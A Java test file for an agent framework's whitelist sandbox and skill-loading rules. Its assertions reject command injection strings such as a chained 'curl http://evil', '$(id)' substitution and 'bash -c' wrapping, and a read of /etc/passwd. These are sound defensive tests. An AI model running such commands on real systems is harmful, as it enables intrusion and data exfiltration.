package com.axion.tool;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import com.axion.core.AgentLoader;
import com.axion.core.ContextLoader;
import com.axion.core.MemoryService;
import com.axion.core.Profile;
import com.axion.core.ProfileContext;
import com.axion.core.PromptBuilder;
import com.axion.core.Session;
import com.axion.core.ToolExecutor;
import com.axion.core.ToolResult;
import com.axion.core.ToolSchemaAdapter;
import com.axion.storage.ToolInvocation;
import com.axion.storage.ToolInvocationRepository;
import com.axion.tool.builtin.ReadFileTool;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.mockito.ArgumentCaptor;
import org.springframework.ai.chat.messages.AssistantMessage;
import org.springframework.ai.chat.messages.SystemMessage;

/**
 * ProgressiveDisclosureTest（011 FR-2/FR-6/FR-5，课件 §三 harness）——渐进式披露三守点：正文常驻 system prompt（现读无缓存）、
 * 参考/脚本不预载（经 read_file/shell 按需取）、未绑定不可见（FILE_READ 动态根 = 当前 Agent 目录）。解释器命令简单形态（坑九）与
 * fail-closed（⑥）同班验证。
 *
 * <p>落 axion-tool 测试（S5 F1 修正）：消费 core 的 PromptBuilder/ContextLoader/AgentLoader + tool 沙箱类，依赖方向合法。
 */
class ProgressiveDisclosureTest {

  // ==================== fixtures ====================

  /** frontmatter 参数含闭合 ---（不带尾换行）；本方法拼 "\n" 后接正文——正文原样（无杂散 --- 行）。 */
  private static void writeAgent(Path agentsRoot, String name, String frontmatter, String body)
      throws Exception {
    Path dir = Files.createDirectories(agentsRoot.resolve(name));
    Files.writeString(dir.resolve("AGENT.md"), frontmatter + "\n" + body);
  }

  private static Profile profileOf(Path workspace, String name) {
    return new AgentLoader()
        .deriveProfile(workspace.resolve("agents").resolve(name), Set.of("deepseek"));
  }

  /** 组装 system prompt 文本（PromptBuilder → 第一条 SystemMessage）。 */
  private static String systemPromptOf(Path workspace, Profile profile) {
    ToolSchemaAdapter adapter = mock(ToolSchemaAdapter.class);
    when(adapter.toToolDefinitions(any())).thenReturn(List.of());
    MemoryService memoryService = mock(MemoryService.class);
    when(memoryService.buildContext(any())).thenReturn("");
    Session session = mock(Session.class);
    when(session.messages()).thenReturn(List.of());
    PromptBuilder builder =
        new PromptBuilder(new ContextLoader(workspace), adapter, Map.of(), memoryService);
    return builder.build(session, profile).getInstructions().stream()
        .filter(SystemMessage.class::isInstance)
        .map(m -> ((SystemMessage) m).getText())
        .findFirst()
        .orElseThrow();
  }

  private static WhitelistSandbox sandbox(
      Path workspace, List<String> commands, List<String> interpreters) {
    return new WhitelistSandbox(
        workspace,
        new FileSandboxProperties(List.of()),
        new ShellSandboxProperties(commands, interpreters),
        new HttpSandboxProperties(List.of()));
  }

  /**
   * 创建目录绑定：POSIX 用符号链接；Windows 无符号链接特权时用 junction（mklink /J，目录挂载点重解析点， Java 侧以 isOther() 识别）——与
   * ContextLoaderTest 同款（测试工具方法，跨模块复制）。
   */
  private static void createBinding(Path link, Path target) throws Exception {
    if (System.getProperty("os.name").toLowerCase(Locale.ROOT).contains("win")) {
      Process process =
          new ProcessBuilder("cmd", "/c", "mklink", "/J", link.toString(), target.toString())
              .redirectErrorStream(true)
              .start();
      int exit = process.waitFor();
      if (exit != 0) {
        String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
        throw new IllegalStateException("junction 创建失败: " + output);
      }
    } else {
      Files.createSymbolicLink(link, link.getParent().relativize(target));
    }
  }

  /** 构造工具参数节点（Windows 路径反斜杠由 ObjectMapper 正确转义——手拼 JSON 字符串会撞上 \U 非法转义）。 */
  private static JsonNode json(Path path) {
    return new ObjectMapper().createObjectNode().put("path", path.toAbsolutePath().toString());
  }

  // ==================== 正文与元数据（FR-2，坑三/坑四/修订说明 ⑦） ====================

  @Test
  @DisplayName("正文进 system prompt：含正文文本、不含 frontmatter 键")
  void bodyInjectedIntoSystemPrompt(@TempDir Path workspace) throws Exception {
    Path agentsRoot = Files.createDirectories(workspace.resolve("agents"));
    writeAgent(
        agentsRoot,
        "daily-reconcile",
        """
        ---
        name: daily-reconcile
        identity:
          prompt: 严谨的对账助手
        provider:
          name: deepseek
        ---\
        """,
        "\n你是每日订单对账助手。被触发时，严格按顺序做，不要跳步。\n");

    String system = systemPromptOf(workspace, profileOf(workspace, "daily-reconcile"));

    assertThat(system).contains("你是每日订单对账助手").contains("严格按顺序做");
    assertThat(system).doesNotContain("provider:").doesNotContain("name: daily-reconcile");
  }

  @Test
  @DisplayName("坑三回归：改正文后下一次 load 即新正文（无缓存、不重启）")
  void bodyChangeVisibleOnNextLoad(@TempDir Path workspace) throws Exception {
    Path agentsRoot = Files.createDirectories(workspace.resolve("agents"));
    writeAgent(
        agentsRoot,
        "daily-reconcile",
        "---\nname: daily-reconcile\nprovider:\n  name: deepseek\n---",
        "正文版本一\n");
    Profile profile = profileOf(workspace, "daily-reconcile");

    assertThat(systemPromptOf(workspace, profile)).contains("正文版本一");

    Files.writeString(
        agentsRoot.resolve("daily-reconcile").resolve("AGENT.md"),
        "---\nname: daily-reconcile\nprovider:\n  name: deepseek\n---\n正文版本二\n");
    assertThat(systemPromptOf(workspace, profile)).contains("正文版本二");
  }

  @Test
  @DisplayName("坑四回归：AGENT.md 缺失 → load 报错点名（不静默）")
  void missingAgentMdThrowsOnLoad(@TempDir Path workspace) throws Exception {
    Files.createDirectories(workspace.resolve("agents"));
    Profile profile =
        new Profile(
            "ghost-agent",
            null,
            new Profile.Identity(null, null),
            new Profile.ProviderRef("deepseek", null, null),
            List.of(),
            List.of(),
            List.of(),
            List.of(),
            List.of(),
            new Profile.Settings(10, 20));

    assertThatThrownBy(() -> new ContextLoader(workspace).load(profile))
        .isInstanceOf(IllegalArgumentException.class)
        .hasMessageContaining("ghost-agent");
  }

  @Test
  @DisplayName("修订说明⑦回归：Skill 元数据注入绑定路径（<agentDir>/skills/<name>/SKILL.md）而非实体真实路径")
  void skillMetadataInjectsBindingPath(@TempDir Path workspace) throws Exception {
    Path agentsRoot = Files.createDirectories(workspace.resolve("agents"));
    writeAgent(
        agentsRoot,
        "daily-reconcile",
        "---\nname: daily-reconcile\nprovider:\n  name: deepseek\n---",
        "正文\n");
    Path entity = Files.createDirectories(workspace.resolve("skills").resolve("report-format"));
    Files.writeString(
        entity.resolve("SKILL.md"),
        "---\nname: report-format\ndescription: 对账差异报告规范\n---\n规范正文不预载");
    Path bindingDir =
        Files.createDirectories(agentsRoot.resolve("daily-reconcile").resolve("skills"));
    createBinding(bindingDir.resolve("report-format"), entity);

    String context = new ContextLoader(workspace).load(profileOf(workspace, "daily-reconcile"));

    Path bindingPath = bindingDir.resolve("report-format").toAbsolutePath().normalize();
    assertThat(context)
        .contains("report-format")
        .contains("对账差异报告规范")
        .contains(bindingPath.resolve("SKILL.md").toString()); // 绑定路径（经软连接透传读实体）
    assertThat(context).doesNotContain(entity.resolve("SKILL.md").toAbsolutePath().toString());
  }

  @Test
  @DisplayName("参考/脚本不预载：system 不含 REFERENCE.md 内容与脚本代码（按需取守点）")
  void referenceAndScriptNotPreloaded(@TempDir Path workspace) throws Exception {
    Path agentsRoot = Files.createDirectories(workspace.resolve("agents"));
    writeAgent(
        agentsRoot,
        "daily-reconcile",
        "---\nname: daily-reconcile\nprovider:\n  name: deepseek\n---",
        "正文指引用 read_file 读 REFERENCE.md、用 shell 跑脚本\n");
    Files.writeString(
        agentsRoot.resolve("daily-reconcile").resolve("REFERENCE.md"), "字段字典：order_id 交易单号");
    Files.createDirectories(agentsRoot.resolve("daily-reconcile").resolve("scripts"));
    Files.writeString(
        agentsRoot.resolve("daily-reconcile").resolve("scripts").resolve("reconcile.py"),
        "import csv  # 脚本代码不应进上下文");

    String system = systemPromptOf(workspace, profileOf(workspace, "daily-reconcile"));

    assertThat(system).contains("正文指引");
    assertThat(system).doesNotContain("字段字典").doesNotContain("import csv");
  }

  // ==================== FILE_READ 动态根（FR-6，坑七） ====================

  @Test
  @DisplayName("坑七回归：绑定路径 read_file 通过动态白名单（本 Agent 目录可读）")
  void readOwnResourcesThroughBinding(@TempDir Path workspace) throws Exception {
    Path agentsRoot = Files.createDirectories(workspace.resolve("agents"));
    writeAgent(
        agentsRoot,
        "daily-reconcile",
        "---\nname: daily-reconcile\nprovider:\n  name: deepseek\n---",
        "正文\n");
    Files.writeString(agentsRoot.resolve("daily-reconcile").resolve("REFERENCE.md"), "字段字典内容");
    Path entity = Files.createDirectories(workspace.resolve("skills").resolve("report-format"));
    Files.writeString(entity.resolve("SKILL.md"), "---\nname: report-format\n---\n规范正文");
    Path bindingDir =
        Files.createDirectories(agentsRoot.resolve("daily-reconcile").resolve("skills"));
    createBinding(bindingDir.resolve("report-format"), entity);

    ReadFileTool readFile = new ReadFileTool(sandbox(workspace, List.of(), List.of()));
    ProfileContext.set(profileOf(workspace, "daily-reconcile"));
    try {
      ToolResult ref =
          readFile.execute(json(agentsRoot.resolve("daily-reconcile").resolve("REFERENCE.md")));
      assertThat(ref.success()).isTrue();
      assertThat(ref.content()).contains("字段字典内容");

      ToolResult skill =
          readFile.execute(
              json(
                  bindingDir
                      .resolve("report-format")
                      .toAbsolutePath()
                      .normalize()
                      .resolve("SKILL.md")));
      assertThat(skill.success()).isTrue();
      assertThat(skill.content()).contains("规范正文");
    } finally {
      ProfileContext.clear();
    }
  }

  @Test
  @DisplayName("坑七回归：他 Agent REFERENCE.md 与未绑定实体路径被拒（未绑定不可见）")
  void otherAgentAndUnboundEntityRejected(@TempDir Path workspace) throws Exception {
    Path agentsRoot = Files.createDirectories(workspace.resolve("agents"));
    writeAgent(
        agentsRoot, "agent-a", "---\nname: agent-a\nprovider:\n  name: deepseek\n---", "正文\n");
    writeAgent(
        agentsRoot, "agent-b", "---\nname: agent-b\nprovider:\n  name: deepseek\n---", "正文\n");
    Files.writeString(agentsRoot.resolve("agent-b").resolve("REFERENCE.md"), "B 的秘密");
    Path unbound = Files.createDirectories(workspace.resolve("skills").resolve("other-skill"));
    Files.writeString(unbound.resolve("SKILL.md"), "---\nname: other-skill\n---\n未绑定实体");

    WhitelistSandbox sandbox = sandbox(workspace, List.of(), List.of());
    ProfileContext.set(profileOf(workspace, "agent-a"));
    try {
      assertThatThrownBy(
              () ->
                  sandbox.enforce(
                      new SandboxAction(
                          ActionType.FILE_READ,
                          agentsRoot
                              .resolve("agent-b")
                              .resolve("REFERENCE.md")
                              .toAbsolutePath()
                              .toString())))
          .isInstanceOf(SandboxViolationException.class);
      assertThatThrownBy(
              () ->
                  sandbox.enforce(
                      new SandboxAction(
                          ActionType.FILE_READ,
                          unbound.resolve("SKILL.md").toAbsolutePath().toString())))
          .isInstanceOf(SandboxViolationException.class);
    } finally {
      ProfileContext.clear();
    }
  }

  @Test
  @DisplayName("坑七回归：无 Agent 上下文 FILE_READ 按静态白名单兜底（动态根缺位不扩大放行面）")
  void fileReadWithoutContextUsesStaticRoots(@TempDir Path workspace) {
    WhitelistSandbox sandbox = sandbox(workspace, List.of(), List.of());

    assertThatThrownBy(
            () ->
                sandbox.enforce(
                    new SandboxAction(ActionType.FILE_READ, workspace.resolve("x.md").toString())))
        .isInstanceOf(SandboxViolationException.class);
  }

  @Test
  @DisplayName("宪法 V 审计零改动核对：read_file 经 ToolExecutor 成败都落 tool_invocations")
  void toolInvocationsWrittenViaToolExecutor(@TempDir Path workspace) throws Exception {
    Path agentsRoot = Files.createDirectories(workspace.resolve("agents"));
    writeAgent(
        agentsRoot,
        "daily-reconcile",
        "---\nname: daily-reconcile\nprovider:\n  name: deepseek\n---",
        "正文\n");
    Files.writeString(agentsRoot.resolve("daily-reconcile").resolve("REFERENCE.md"), "内容");
    ToolInvocationRepository auditRepo = mock(ToolInvocationRepository.class);
    ReadFileTool readFile = new ReadFileTool(sandbox(workspace, List.of(), List.of()));
    ToolExecutor executor =
        new ToolExecutor(Map.of("read_file", readFile), auditRepo, new ObjectMapper());
    ProfileContext.set(profileOf(workspace, "daily-reconcile"));
    try {
      ToolResult ok =
          executor.execute(
              "sess-1",
              new AssistantMessage.ToolCall(
                  "call-1",
                  "function",
                  "read_file",
                  json(agentsRoot.resolve("daily-reconcile").resolve("REFERENCE.md")).toString()));
      assertThat(ok.success()).isTrue();

      ToolResult rejected =
          executor.execute(
              "sess-1",
              new AssistantMessage.ToolCall(
                  "call-2", "function", "read_file", "{\"path\":\"/etc/passwd\"}"));
      assertThat(rejected.success()).isFalse();

      ArgumentCaptor<ToolInvocation> captor = ArgumentCaptor.forClass(ToolInvocation.class);
      verify(auditRepo, org.mockito.Mockito.times(2)).save(captor.capture());
      assertThat(captor.getAllValues().get(0).getSuccess()).isTrue();
      assertThat(captor.getAllValues().get(1).getSuccess()).isFalse();
      assertThat(captor.getAllValues().get(1).getErrorMessage()).contains("路径不在白名单内");
    } finally {
      ProfileContext.clear();
    }
  }

  // ==================== L3 解释器命令（FR-5，坑九/⑥） ====================

  @Test
  @DisplayName("简单形态放行：解释器 + scripts/ 相对路径 + 脚本参数透传（S2 澄清）")
  void interpreterSimpleFormAllowed(@TempDir Path workspace) throws Exception {
    Path agentsRoot = Files.createDirectories(workspace.resolve("agents"));
    writeAgent(
        agentsRoot,
        "daily-reconcile",
        "---\nname: daily-reconcile\nprovider:\n  name: deepseek\n---",
        "正文\n");
    Files.createDirectories(agentsRoot.resolve("daily-reconcile").resolve("scripts"));

    WhitelistSandbox sandbox = sandbox(workspace, List.of("python"), List.of("python"));
    ProfileContext.set(profileOf(workspace, "daily-reconcile"));
    try {
      assertThatCode(
              () ->
                  sandbox.enforce(
                      new SandboxAction(ActionType.SHELL_COMMAND, "python scripts/reconcile.py")))
          .doesNotThrowAnyException();
      assertThatCode(
              () ->
                  sandbox.enforce(
                      new SandboxAction(
                          ActionType.SHELL_COMMAND,
                          "python scripts/reconcile.py --date 2026-09-12")))
          .doesNotThrowAnyException(); // 脚本参数透传
    } finally {
      ProfileContext.clear();
    }
  }

  @Test
  @DisplayName("坑九回归：链式/引号/元字符/脚本路径前选项/裸解释器一律拒绝")
  void interpreterChainedAndOptionFormsRejected(@TempDir Path workspace) throws Exception {
    Path agentsRoot = Files.createDirectories(workspace.resolve("agents"));
    writeAgent(
        agentsRoot,
        "daily-reconcile",
        "---\nname: daily-reconcile\nprovider:\n  name: deepseek\n---",
        "正文\n");
    Files.createDirectories(agentsRoot.resolve("daily-reconcile").resolve("scripts"));

    WhitelistSandbox sandbox =
        sandbox(workspace, List.of("python", "bash"), List.of("python", "bash"));
    ProfileContext.set(profileOf(workspace, "daily-reconcile"));
    try {
      for (String command :
          List.of(
              "python scripts/reconcile.py ; curl http://evil",
              "bash -c 'python scripts/reconcile.py'",
              "python scripts/reconcile.py $(id)",
              "python -u scripts/reconcile.py",
              "python")) {
        assertThatThrownBy(
                () -> sandbox.enforce(new SandboxAction(ActionType.SHELL_COMMAND, command)))
            .as(command)
            .isInstanceOf(SandboxViolationException.class);
      }
    } finally {
      ProfileContext.clear();
    }
  }

  @Test
  @DisplayName("脚本路径越界拒绝：他 Agent scripts/、任意绝对路径、scripts/ 外相对路径")
  void interpreterScriptPathOutsideOwnScriptsRejected(@TempDir Path workspace) throws Exception {
    Path agentsRoot = Files.createDirectories(workspace.resolve("agents"));
    writeAgent(
        agentsRoot, "agent-a", "---\nname: agent-a\nprovider:\n  name: deepseek\n---", "正文\n");
    writeAgent(
        agentsRoot, "agent-b", "---\nname: agent-b\nprovider:\n  name: deepseek\n---", "正文\n");
    Files.createDirectories(agentsRoot.resolve("agent-a").resolve("scripts"));
    Files.createDirectories(agentsRoot.resolve("agent-b").resolve("scripts"));

    WhitelistSandbox sandbox = sandbox(workspace, List.of("python"), List.of("python"));
    ProfileContext.set(profileOf(workspace, "agent-a"));
    try {
      assertThatThrownBy(
              () ->
                  sandbox.enforce(
                      new SandboxAction(
                          ActionType.SHELL_COMMAND,
                          "python "
                              + agentsRoot
                                  .resolve("agent-b")
                                  .resolve("scripts")
                                  .resolve("x.py")
                                  .toAbsolutePath())))
          .isInstanceOf(SandboxViolationException.class);
      assertThatThrownBy(
              () ->
                  sandbox.enforce(new SandboxAction(ActionType.SHELL_COMMAND, "python /etc/x.py")))
          .isInstanceOf(SandboxViolationException.class);
      assertThatThrownBy(
              () ->
                  sandbox.enforce(new SandboxAction(ActionType.SHELL_COMMAND, "python README.md")))
          .isInstanceOf(SandboxViolationException.class); // scripts/ 外相对路径
    } finally {
      ProfileContext.clear();
    }
  }

  @Test
  @DisplayName("⑥ fail-closed：无 Agent 上下文解释器命令一律拒绝（非解释器命令 007 语义不变）")
  void interpreterWithoutAgentContextRejected(@TempDir Path workspace) throws Exception {
    Path agentsRoot = Files.createDirectories(workspace.resolve("agents"));
    writeAgent(
        agentsRoot,
        "daily-reconcile",
        "---\nname: daily-reconcile\nprovider:\n  name: deepseek\n---",
        "正文\n");

    WhitelistSandbox sandbox = sandbox(workspace, List.of("python", "ls"), List.of("python"));

    assertThatThrownBy(
            () ->
                sandbox.enforce(
                    new SandboxAction(ActionType.SHELL_COMMAND, "python scripts/reconcile.py")))
        .isInstanceOf(SandboxViolationException.class)
        .hasMessageContaining("Agent 上下文");
    assertThatCode(() -> sandbox.enforce(new SandboxAction(ActionType.SHELL_COMMAND, "ls -la")))
        .doesNotThrowAnyException(); // 非解释器命令：007 语义原样（无需上下文）
  }
}
